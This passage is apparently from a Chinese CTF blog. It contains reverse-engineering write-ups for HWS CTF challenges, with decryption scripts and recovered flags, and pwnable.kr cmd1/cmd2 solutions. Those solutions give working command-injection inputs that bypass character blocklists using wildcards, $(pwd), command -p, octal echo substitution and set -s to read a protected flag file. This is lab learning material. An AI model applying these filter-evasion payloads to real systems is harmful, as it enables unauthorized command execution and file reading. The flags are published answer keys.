class="line">.text:0040198B                 mov     byte_457A04[ecx], bl</span><br><span class="line">.text:00401991                 inc     ecx</span><br><span class="line">.text:00401992                 jmp     short loc_40195A</span><br><span class="line">.text:00401994 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401994</span><br><span class="line">.text:00401994 loc_401994:                             ; CODE XREF: .text:0040195D↑j</span><br><span class="line">.text:00401994                 mov     al, byte_457A04</span><br><span class="line">.text:00401999                 mov     byte_457A28, al</span><br><span class="line">.text:0040199E                 mov     ecx, 1</span><br><span class="line">.text:004019A3</span><br><span class="line">.text:004019A3 loc_4019A3:                             ; CODE XREF: .text:004019CE↓j</span><br><span class="line">.text:004019A3                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:004019A6                 jge     short loc_4019D0</span><br><span class="line">.text:004019A8                 mov     bl, byte_457A04[ecx]</span><br><span class="line">.text:004019AE                 mov     esi, ecx</span><br><span class="line">.text:004019AE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B0                 db 0C7h                 ; inc ecx</span><br><span class="line">.text:004019B1                 db 0FFh                 </span><br><span class="line">.text:004019B2                 db    3 </span><br><span class="line">.text:004019B3                 db    5</span><br><span class="line">.text:004019B4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B4                 xor     bl, byte_457A04[esi]</span><br><span class="line">.text:004019BA                 mov     esi, ecx</span><br><span class="line">.text:004019BA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019BC                 db 0C7h                 ; and esi, 3</span><br><span class="line">.text:004019BD                 db 0FFh                              </span><br><span class="line">.text:004019BE                 db    4 </span><br><span class="line">.text:004019BF                 db    5</span><br><span class="line">.text:004019C0                 db    3</span><br><span class="line">.text:004019C1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019C1                 xor     bl, byte ptr aBier[esi] ; &quot;Bier&quot;</span><br><span class="line">.text:004019C7                 mov     byte_457A28[ecx], bl</span><br><span class="line">.text:004019CD                 inc     ecx</span><br><span class="line">.text:004019CE                 jmp     short loc_4019A3</span><br></pre></td></tr></table></figure><p>加密过程不复杂，首先计算了一组0到31的无序数，然后按照无序数两个一组交换输入数据，接着进行位运算，总体向前移动了三位，最后进行了异或加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解异或加密的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>():</span></span><br><span class="line">    res = []</span><br><span class="line">    key = <span class="string">&#x27;Bier&#x27;</span></span><br><span class="line">    Cipher = <span class="string">&#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(Cipher),<span class="number">2</span>):</span><br><span class="line">        res.append(int(Cipher[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(res)):</span><br><span class="line">        res[i] = res[i] ^ ord(key[(i)%<span class="number">4</span>]) ^ res[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59]</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 位运算脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    BYTE byte[] = &#123; <span class="number">147</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">170</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">105</span>, <span class="number">139</span>, <span class="number">179</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">147</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">129</span>, <span class="number">155</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">131</span>, <span class="number">34</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">107</span>, <span class="number">59</span> &#125;;</span><br><span class="line">    BYTE index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> first = byte[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="number">147</span> &gt;&gt;<span class="number">3</span>)&amp;<span class="number">0xFF</span> | (<span class="number">59</span> &lt;&lt;<span class="number">5</span>)&amp;<span class="number">0xFF</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        BYTE x = (byte[i] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        BYTE y = (byte[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x | y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 交换位置</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span>():</span></span><br><span class="line">    flag = list(<span class="string">&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;</span>)</span><br><span class="line">    index = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        num += <span class="number">0x11</span></span><br><span class="line">        num &amp;= <span class="number">0x1F</span></span><br><span class="line">        index.append(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">        flag[index[i]], flag[index[i+<span class="number">1</span>]] = flag[index[i+<span class="number">1</span>]], flag[index[i]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        print(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><em>flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</em></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​        这道题过程不复杂，调用了SetUnhandledExceptionFilter，注册异常处理函数，通过C7这个非法指令触发异常，运行这个异常处理函数，从而进行加密操作</p><p>​        如果想动态调试的话可以直接改字节码（我只会这一种方法。。）不知道还有没有其他方法，但是做题的时候需要细心一点，因为汇编的一些过程没有看清导致浪费了我很多时间</p><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>我搞得最烦的一道题。。以前没有搞过带iv的AES，也从来没有看过sha256和md5的反编译代码，这次算是遇到了。。看了很久都没有看出来，最后看了别的师傅的wp才出来的。其实这道题知道了md5和sha256之后加密过程并不复杂，但是如果是第一次遇到那就恼火了（比如像我）</p><p>总共算下来这道题一共有5个步骤</p><ol><li><p>字符串转16进制</p><p>打个比方：比如我们输入123456，那么程序会将我们输入的转为 12 23 45这三个16进制数进行保存，因此前面只允许输入0-9 a-f的字符</p><p><img src="HWSCTF.assets/image-20210205003234483.png" alt="image-20210205003234483"></p></li><li><p>位运算</p><p>总体向前移动了三位（我怀疑这次的题是一个人出的，加密算法都好相似。。）</p><p><img src="HWSCTF.assets/image-20210205003456605.png"></p></li><li><p>计算key和iv</p><p><img src="HWSCTF.assets/image-20210205003652039.png"></p></li><li><p>rc4和AES</p><p>注意AES是解密，题目用的是Res盒子，并不是常规的S盒子，所以我们写脚本的时候是加密</p><p><img src="HWSCTF.assets/image-20210205004416149.png"></p></li></ol><p>5.与用md5生成的序列比较</p><p><img src="HWSCTF.assets/image-20210205004520967.png"></p><p>如果序列号比对成功，程序就会读取flag.enc中的二进制数据，我们输入然后通过加密计算得到的序列号就会作为key解密flag.enc的二进制数据流，同样也是AES CBC模式，但是这部分不用我们关心，我们只需要得到正确的序列号就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES,ARC4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">string = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">new_res = [<span class="number">0x8c</span>]</span><br><span class="line"></span><br><span class="line">Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())</span><br><span class="line">digest = hashlib.sha256(string).hexdigest()</span><br><span class="line"></span><br><span class="line">res = [i <span class="keyword">for</span> i <span class="keyword">in</span> binascii.unhexlify(digest)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    new_res.append(res[i] ^ res[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># aes加密</span></span><br><span class="line">key = binascii.a2b_hex((bytes(new_res).hex()[:<span class="number">32</span>]).encode())</span><br><span class="line">iv = binascii.a2b_hex((bytes(new_res).hex()[<span class="number">32</span>:]).encode())</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">Cipher_AES = aes.encrypt(Plain_AES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rc4加密</span></span><br><span class="line">rc4_cipher = Cipher_AES</span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">rc4_plain = rc4.decrypt(rc4_cipher)</span><br><span class="line">print(rc4_plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位运算</span></span><br><span class="line">big_num_hex = binascii.hexlify(rc4_plain)</span><br><span class="line">big_num_bin = bin(int(big_num_hex, <span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">16</span>*<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">big_num_bin = big_num_bin[<span class="number">3</span>:] + big_num_bin[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag += hex(int(big_num_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 653b987431e5a2fc7c3d748fba008869</span></span><br></pre></td></tr></table></figure><p><img src="HWSCTF.assets/image-20210205005157181.png"></p><h3 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h3><ol><li>常见的加密算法特征不清楚（大问题）</li><li>看汇编不仔细（需要改掉自己粗心的毛病）</li><li>windows方面知识还是不够</li><li>题型见得太少了，感觉做了一道题就累的要死😑，真的佩服比赛从开始肝到最后的师傅们</li><li>学习了怎么使用Cryptdome库，windows的几种反调试（异常注册，debug bloker)，下次在遇到就不会这么痛苦了吧（大概）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;babyre&quot;&gt;&lt;a href=&quot;#babyre&quot; class=&quot;headerlink&quot; title=&quot;babyre&quot;&gt;&lt;/a&gt;babyre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;HWSCTF.assets/image-20210</summary>
      
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr cmd1 cmd2</title>
    <link href="http://example.com/2021/01/31/CTF/pwn/pwnable/pwnable.kr%20cmd1%20cmd2/"/>
    <id>http://example.com/2021/01/31/CTF/pwn/pwnable/pwnable.kr%20cmd1%20cmd2/</id>
    <published>2021-01-31T08:35:25.563Z</published>
    <updated>2021-05-03T17:13:25.023Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><p><a href="http://c.biancheng.net/view/5876.html">linuxPATH入门教学</a><br><a href="https://blog.csdn.net/qq_16334327/article/details/96591949">linux命令通配符</a><br><a href="https://blog.csdn.net/shisiye15/article/details/7846557">putenv函数讲解</a></p><p>这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法</p><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201203616211.png"></p><h4 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h4><p>首先ssh登录，查看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序将PATH环境设置成了一个不存在的路径导致不能直接使用命令，而且filter函数过滤掉了我们输入的一些字符。</p><p>这里我们可以先来测试一下PATH如果被改变会怎么样，下面贴测试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打印改变前的PATH，并且使用命令</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;before PATH: %s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//改变PATH，将其设置成一个不存在的路径</span></span><br><span class="line">        putenv(<span class="string">&quot;PATH=/aaa&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//再次打印路径</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;after PATH: %s\n&quot;</span>, getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行，这里我们测试的命令是 <strong>ls</strong> ，可以发现ls命令已经失效了，由于PATH的路径被临时改变，需要使用ls命令的绝对路径 <strong>/bin/ls</strong></p><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201204940643.png"></p><p>再次测试，使用命令的绝对路径 <strong>/bin/ls</strong>，可以发现又可以正常运行了</p><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201205043930.png"></p><p>所以这道题我们需要输入<strong>cat</strong>命令的绝对路径 <strong>/bin/cat</strong>，但是问题又来了，flag这个词被过滤掉了，这就需要使用到统配符了，我们可以使用 <strong>“/bin/cat f*“</strong> 或者 <strong>“/bin/cat fla?”</strong> 等命令来实现查看flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 &#x27;/bin/cat fla?&#x27;</span><br><span class="line">./cmd1 &#x27;/bin/cat f*&#x27;</span><br></pre></td></tr></table></figure><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201205526147.png"></p><p><em>mommy now I get what PATH environment is for :)</em></p><h4 id="method-2"><a href="#method-2" class="headerlink" title="method 2"></a>method 2</h4><p>第二种方法是我们采用shell编程方式，先创建一个文件，在利用程序打开我们的文件，在文件中，我们可以使用任意字符而不受限制</p><ul><li><p>首先现在服务器的/tmp/目录下创建一个我们自己使用的目录，然后在目录中创建我们的文件，一会儿需要用程序来调用</p><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201210815614.png"></p></li><li><p>在创建bash文件，文件名字里面千万不能带有过滤字符（我踩了这个坑😥），然后写入命令</p></li></ul><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201212309793.png"></p><ul><li>让程序调用文件，一样可以达到效果</li></ul><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201212435273.png"></p><h3 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h3><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210201212556897.png"></p><p>cmd2的考点与cmd1大同小异，只是这一次源码中过滤了更多的字符，需要更高的技巧才能绕过字符过滤检测拿到flag，下面贴源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这次程序直接过滤了’/‘,’.’之类的符号，连路径都不让使用💔 下面我提供几种种方法（网上看到总结的，学习一手）</p><h4 id="利用pwd"><a href="#利用pwd" class="headerlink" title="利用pwd"></a>利用pwd</h4><p>利用$，我们可以进入到根目录，用$(pwd)来代替’/‘</p><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210202002742365.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">/home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;</span><br><span class="line">/home/cmd2/cmd2 &quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*&quot;</span><br></pre></td></tr></table></figure><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210202001835043.png"></p><p>上面两种写法都可以，这是linux中双引号和单引号的区别，下面这篇文章可以了解他们之间的区别</p><p><a href="https://blog.csdn.net/u014636245/article/details/82919144">Linux中单引号双引号的区别与用法</a></p><h4 id="command-p"><a href="#command-p" class="headerlink" title="command -p"></a>command -p</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;command -p&#x27; //这条命令会强制将环境变为默认值，就不用使用绝对路径</span><br><span class="line">./cmd2 &#x27;command -p cat f*&#x27;</span><br></pre></td></tr></table></figure><h4 id="echo解析8进制与16进制"><a href="#echo解析8进制与16进制" class="headerlink" title="echo解析8进制与16进制"></a>echo解析8进制与16进制</h4><p>在网上看别人wp学的其实我觉得原理和第一个差不太多，这个是利用echo可以解析16进制和8进制表示的字符串（但是不能用参数 -e），具体情况要看系统版本。（我在网上看到他们在远程服务器上echo命令可以解释8进制，但我试了试就不行，还是记录下这个方法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 /bin/cat flag 转化为8进制</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd = <span class="string">&quot;/bin/cat flag&quot;</span></span><br><span class="line">print(<span class="string">&quot;\\&quot;</span>+<span class="string">&quot;\\&quot;</span>.join([oct(i) <span class="keyword">for</span> i <span class="keyword">in</span> ordlist(cmd)]))</span><br><span class="line"><span class="comment"># \057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>我的本地虚拟机就不可以直接用echo命令转，需要参数-e</p><p><img src="pwnable.kr%20cmd1%20cmd2.assets/image-20210202000852202.png"></p><h4 id="set-s"><a href="#set-s" class="headerlink" title="set -s"></a>set -s</h4><p>具体的原理还没有在网上找到，等后面补充</p><p><a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash 脚本 set 命令教程</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;set -s&#x27;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">/bin/cat flag</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>shell编程点都不会，其实上学期学了的，只是上网课一点都没有认真听。。想在想起来有点傻，后面需要补习下shell的知识</p></li><li><p>linux的东西太灵活了。。其实上面的两道题还有几种其他的方法，但是我精力和时间有限，只收集了几种我感觉还可以的方法</p></li><li><p>我太菜了。。🐹</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

